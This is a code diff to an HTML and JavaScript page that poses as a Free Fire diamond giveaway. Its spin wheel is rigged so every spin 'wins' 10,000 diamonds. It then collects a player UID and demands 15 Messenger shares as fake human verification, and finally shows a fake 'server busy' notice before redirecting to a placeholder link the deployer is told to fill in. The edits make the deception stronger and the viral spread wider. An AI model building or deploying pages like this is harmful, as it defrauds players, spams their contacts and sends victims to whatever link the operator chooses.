@@ -6,7 +6,10 @@
     <title>Free Fire Diamond Rewards</title>
     <style>
         body {
-            background-color: #f4f7f6; /* Clean Light Grey/White Background */
+            /* Clean background with a centered, faded Free Fire Logo */
+            background: #f4f7f6 url('https://upload.wikimedia.org/wikipedia/en/2/22/Garena_Free_Fire_logo.png') no-repeat center center fixed;
+            background-blend-mode: overlay;
+            background-size: 300px;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
@@ -20,18 +23,20 @@
             margin: 15px 0;
             width: 320px;
             height: 50px;
+            z-index: 100;
         }
 
         #main-container {
             text-align: center;
-            background: #ffffff;
+            background: rgba(255, 255, 255, 0.95);
             color: #333;
             padding: 30px;
             border-radius: 15px;
             max-width: 380px;
             width: 90%;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1); /* Soft shadow for clean look */
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
             border: 1px solid #ddd;
+            backdrop-filter: blur(10px);
         }
 
         canvas {
@@ -43,7 +48,7 @@
             box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
 
-        h2 { color: #2c3e50; margin-top: 0; }
+        h2 { color: #2c3e50; margin-top: 0; text-transform: uppercase; }
 
         button {
             padding: 14px 30px;
@@ -54,16 +59,15 @@
             cursor: pointer;
             font-size: 16px;
             margin-top: 15px;
-            width: 90%;
+            width: 95%;
             transition: 0.2s;
         }
 
-        .btn-spin { background: #e74c3c; } /* Red for Spin */
-        .btn-spin:hover { background: #c0392b; }
+        .btn-spin { background: #e74c3c; box-shadow: 0 4px #c0392b; }
+        .btn-spin:active { transform: translateY(4px); box-shadow: 0 0 #c0392b; }
 
-        .btn-redeem { background: #27ae60; } /* Green for Redeem */
-        
-        .btn-share { background: #0084FF; } /* Messenger Blue */
+        .btn-redeem { background: #27ae60; }
+        .btn-share { background: #0084FF; }
         
         input {
             padding: 12px;
@@ -83,14 +87,27 @@
             background-color: #eee;
             border-radius: 10px;
             margin: 15px 0;
+            height: 25px;
             overflow: hidden;
+            border: 1px solid #ccc;
+            position: relative;
         }
 
         #progress-bar {
             width: 0%;
-            height: 20px;
-            background-color: #27ae60;
-            transition: width 0.5s;
+            height: 100%;
+            background: linear-gradient(90deg, #27ae60, #2ecc71);
+            transition: width 0.4s ease-in-out;
+        }
+
+        #percent-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            line-height: 25px;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333;
         }
 
         #error-section {
@@ -121,7 +138,7 @@
 
     <div id="main-container">
         <h2>💎 Lucky Spin 💎</h2>
-        <p style="color: #7f8c8d;">Win Free Fire Diamonds Instantly</p>
+        <p style="color: #7f8c8d; font-size: 14px;">Win Free Fire Diamonds Instantly</p>
 
         <div style="position: relative; width: 250px; height: 250px; margin: 20px auto;">
             <div style="position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #e74c3c; z-index: 10;"></div>
@@ -132,24 +149,27 @@
 
         <div id="uid-section" style="display:none;">
             <h3 id="win-text" style="color: #27ae60;"></h3>
-            <p>Enter Player UID to process:</p>
-            <input type="number" id="player-uid" placeholder="Enter UID here">
+            <p>Enter Player UID:</p>
+            <input type="number" id="player-uid" placeholder="Example: 10452683">
             <button class="btn-redeem" onclick="redeem()">REDEEM NOW</button>
         </div>
 
         <div id="share-section" style="display:none;">
-            <p style="font-weight: bold;">Verification Needed!</p>
-            <p style="font-size: 13px; color: #666;">Send to 5 friends on Messenger to verify you are human.</p>
+            <p style="font-weight: bold; margin-bottom: 5px;">Human Verification</p>
+            <p style="font-size: 12px; color: #666;">Share with 15 Friends or 5 Groups on Messenger to complete.</p>
+            
             <div class="progress-container">
+                <div id="percent-text">0%</div>
                 <div id="progress-bar"></div>
             </div>
-            <p id="share-count" style="font-size: 14px;">Progress: <span id="count-num">0</span>/5</p>
-            <button class="btn-share" onclick="shareToFriends()">SEND TO FRIENDS</button>
+            
+            <p id="share-count" style="font-size: 14px; margin-top: 5px;">Share Progress: <span id="count-num">0</span>/15</p>
+            <button class="btn-share" onclick="shareToFriends()">SEND ON MESSENGER</button>
         </div>
 
         <div id="error-section">
             ⚠️ SERVER BUSY!<br>
-            <span style="color: #555; font-size: 12px; font-weight: normal;">Please wait while we redirect you...</span>
+            <span style="color: #555; font-size: 12px; font-weight: normal;">Too many users. Redirecting to backup server...</span>
         </div>
     </div>
 
@@ -169,10 +189,11 @@
 <script>
 const canvas = document.getElementById('wheelCanvas');
 const ctx = canvas.getContext('2d');
-const segments = ["1000 💎", "5000 💎", "Try Again", "2500 💎", "10000 💎", "500 💎"];
-const colors = ["#1abc9c", "#3498db", "#95a5a6", "#f1c40f", "#9b59b6", "#e67e22"];
+const segments = ["1000 💎", "5000 💎", "2500 💎", "10000 💎", "500 💎", "7500 💎"];
+const colors = ["#1abc9c", "#3498db", "#e74c3c", "#f1c40f", "#9b59b6", "#e67e22"];
 let currentRotation = 0;
 let shareClicks = 0;
+const totalNeeded = 15; // Set to 15 shares
 
 function drawWheel() {
     const sliceAngle = (2 * Math.PI) / segments.length;
@@ -199,7 +220,7 @@ function startSpin() {
     currentRotation += randomSpin;
     canvas.style.transform = `rotate(${currentRotation}deg)`;
     setTimeout(() => {
-        document.getElementById('win-text').innerText = "YOU WON 5,000 DIAMONDS!";
+        document.getElementById('win-text').innerText = "YOU WON 10,000 DIAMONDS!";
         document.getElementById('uid-section').style.display = "block";
         document.getElementById('spin-btn').style.display = "none";
     }, 4000);
@@ -214,18 +235,26 @@ function redeem() {
 
 function shareToFriends() {
     shareClicks++;
-    let percentage = shareClicks * 20;
+    
+    // Percentage Calculation
+    let percentage = Math.floor((shareClicks / totalNeeded) * 100);
+    if (percentage > 100) percentage = 100;
+
+    // Update Progress UI
     document.getElementById('progress-bar').style.width = percentage + "%";
+    document.getElementById('percent-text').innerText = percentage + "%";
     document.getElementById('count-num').innerText = shareClicks;
 
+    // Open Messenger
     window.open("fb-messenger://share/?link=" + encodeURIComponent(window.location.href), "_blank");
 
-    if (shareClicks >= 5) {
+    // Check if task complete
+    if (shareClicks >= totalNeeded) {
         setTimeout(() => {
             document.getElementById('share-section').style.display = "none";
             document.getElementById('error-section').style.display = "block";
             setTimeout(() => {
-                window.location.href = "https://your-xyz-link.com"; // <-- PUT YOUR LINK HERE
+                window.location.href = "https://your-xyz-link.com"; // <-- REPLACE THIS WITH YOUR LINK
             }, 3000);
         }, 1000);
     }
